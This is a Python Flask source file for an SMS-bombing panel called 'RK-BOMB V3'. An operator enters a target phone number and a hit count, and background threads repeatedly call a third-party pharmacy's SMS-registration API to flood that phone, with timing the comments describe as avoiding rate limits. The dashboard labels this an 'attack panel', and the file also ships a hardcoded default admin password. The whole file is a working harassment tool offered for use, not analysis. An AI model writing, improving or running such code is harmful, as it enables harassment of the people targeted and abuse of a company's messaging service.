import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ---------- CONFIG & DB ----------
def get_db():
    conn = sqlite3.connect('system_rk_v3.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, total INTEGER, limit_amt INTEGER, status TEXT, 
            start_time TEXT, stop_time TEXT, duration TEXT, date_str TEXT)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- BOMBING CORE ----------
active_sessions = {}

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    
    # আপনার API লিস্ট এখানে বসান (একাধিক দিলে রেন্ডমলি কাজ করবে)
    api_list = [
        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"
        # "https://example.com/api2?number={}",
    ]

    while key in active_sessions:
        curr = active_sessions[key]
        if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped':
            break
            
        if curr['status'] == 'Running':
            try:
                target_api = random.choice(api_list).format(phone)
                res = requests.get(target_api, timeout=10)
                if res.status_code == 200:
                    active_sessions[key]['success'] += 1
                    active_sessions[key]['new_hit'] = True
            except: pass
            
            active_sessions[key]['total'] += 1
            time.sleep(1.2) # API রেট লিমিট এড়াতে
        else:
            time.sleep(1)

    # Finalizing Data
    stop_dt = datetime.now()
    duration = str(stop_dt - start_dt).split('.')[0]
    s = active_sessions.get(key)
    if s:
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, total, limit_amt, status, start_time, stop_time, duration, date_str) VALUES (?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['total'], s['limit'], "Finished", s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y")))
        del active_sessions[key]

# ---------- ADVANCED UI ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-BOMB ULTIMATE</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #050505; --card: #111; }
        body { background: var(--bg); color: var(--neon); font-family: 'Rajdhani', sans-serif; margin: 0; padding: 0; }
        .nav { background: #000; padding: 15px; border-bottom: 1px solid var(--neon); display: flex; justify-content: space-between; position: sticky; top:0; z-index: 100;}
        .container { padding: 20px; max-width: 600px; margin: auto; }
        .card { background: var(--card); border: 1px solid #222; border-radius: 15px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .fire-btn { background: var(--neon); color: #000; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; font-family: 'Rajdhani'; font-size: 16px; }
        .fire-btn:hover { box-shadow: 0 0 20px var(--neon); transform: translateY(-2px); }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(0,255,204,0.2); }
        .prog-bg { background: #222; height: 12px; border-radius: 6px; overflow: hidden; margin: 15px 0; }
        .prog-bar { background: linear-gradient(90deg, #00ffcc, #0099ff); height: 100%; width: 0%; transition: 0.5s; }
        .badge { background: #1a1a1a; padding: 5px 10px; border-radius: 5px; font-size: 12px; border: 1px solid #333; }
        a { color: var(--neon); text-decoration: none; font-weight: bold; }
        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
    </style>
</head>
<body>
    <audio id="hitSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
    <div class="nav">
        <div style="font-weight: 700; font-size: 20px;">RK-BOMB <span style="color:#fff">V3</span></div>
        <div style="font-size: 14px;"><a href="/dashboard">DASH</a> | <a href="/history">LOGS</a> | <a href="/logout" style="color: #ff4444;">EXIT</a></div>
    </div>
    <div class="container">[CONTENT]</div>
    <script>
        function playHit() { let s = document.getElementById('hitSound'); s.currentTime=0; s.play().catch(e=>{}); }
        function sync() {
            if(!document.getElementById('live-engine')) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k];
                    if(s.new_hit) playHit();
                    let p = (s.total/s.limit)*100;
                    html += `<div class="card" style="border-left: 4px solid var(--neon)">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <b>TARGET: ${s.phone}</b>
                            <span class="badge">${s.status}</span>
                        </div>
                        <div class="prog-bg"><div class="prog-bar" style="width:${p}%"></div></div>
                        <div class="stat-grid">
                            <div class="badge">Success: ${s.success}</div>
                            <div class="badge">Total: ${s.total} / ${s.limit}</div>
                        </div>
                        <div class="stat-grid">
                            <button class="fire-btn" style="background:#ffaa00; font-size:12px;" onclick="location.href='/api/control?num=${s.phone}&action=${s.status=='Running'?'Paused':'Running'}'">${s.status=='Running'?'PAUSE':'RESUME'}</button>
                            <button class="fire-btn" style="background:#ff4444; color:#fff; font-size:12px;" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                        </div>
                    </div>`;
                }
                document.getElementById('live-engine').innerHTML = html;
            });
        }
        setInterval(sync, 2000);
    </script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="card" style="text-align:center;"><h2>SYSTEM ACCESS</h2><form method="POST"><input name="u" placeholder="Admin ID" required><input name="p" type="password" placeholder="Password" required><button class="fire-btn">INITIALIZE</button></form></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="card">
            <h3 style="margin-top:0">🚀 ATTACK PANEL</h3>
            <form action="/api/start">
                <input name="num" placeholder="Phone Number (e.g. 017...)" required>
                <input name="amt" type="number" placeholder="Hit Amount (Max 500)" max="500" required>
                <button class="fire-btn">LAUNCH ATTACK</button>
            </form>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        logs = conn.execute("SELECT * FROM history ORDER BY id DESC LIMIT 15").fetchall()
    
    html = '<h3>📜 RECENT LOGS</h3>'
    for l in logs:
        html += f'''<div class="card" style="font-size:14px; padding:15px;">
            <div style="display:flex; justify-content:space-between;"><b>{l['phone']}</b> <span>{l['date_str']}</span></div>
            <div style="color:#888; margin-top:5px;">Hits: {l['success']} | Duration: {l['duration']}</div>
        </div>'''
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'total': 0, 'limit': int(amt), 
            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'new_hit': False
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    data = {k: v for k, v in active_sessions.items() if k.startswith(u)}
    res = jsonify(data)
    for k in data: active_sessions[k]['new_hit'] = False
    return res

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
